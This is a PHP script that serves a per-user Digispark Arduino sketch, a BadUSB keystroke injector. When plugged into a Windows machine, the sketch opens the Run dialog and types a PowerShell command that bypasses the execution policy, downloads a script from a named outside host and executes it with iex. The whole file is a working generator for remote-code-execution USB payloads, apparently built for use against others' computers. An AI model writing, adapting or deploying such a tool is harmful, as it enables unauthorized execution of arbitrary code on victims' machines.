<?php
/* gen_arduino.php – returns a ready‑to‑upload Digispark Arduino sketch.
 * Usage: https://your‑host.com/gen_arduino.php?token=YourToken
 */
require_once __DIR__ . '/db.php';

$token = $_GET['token'] ?? '';
if (empty($token)) {
    http_response_code(403);
    exit('Access Denied: Missing token.');
}

// Optional token validation (ensures a registered user)
$stmt = $pdo->prepare('SELECT id FROM users WHERE token = ?');
$stmt->execute([$token]);
$user = $stmt->fetch();
if (!$user) {
    http_response_code(403);
    exit('Access Denied: Invalid token.');
}

// The Arduino sketch – the token is interpolated directly into the URL
$sketch = <<<"ARDUINO"
#include "DigiKeyboard.h"

#define KEY_R 0x15   // "R" key code (Win+R)

void setup() {
  pinMode(1, OUTPUT);   // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);       // clear any stuck keys
  DigiKeyboard.delay(2000);            // give the system a moment

  // ── Open Run dialog (Win + R) ────────────────────────────────────────
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // ── Launch PowerShell (visible) and pull the payload dynamically ────────
  DigiKeyboard.println("powershell -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command \"iex (New-Object Net.WebClient).DownloadString('https://narain.udhees.com/payload.php?token={$token}')\"");
  DigiKeyboard.delay(3000);   // give PowerShell time to execute

  // ── Visual feedback – blink the on‑board LED forever ─────────────────────
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(150);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(150);
  }
}
ARDUINO;

header('Content-Type: text/plain; charset=utf-8');
echo $sketch;
?>
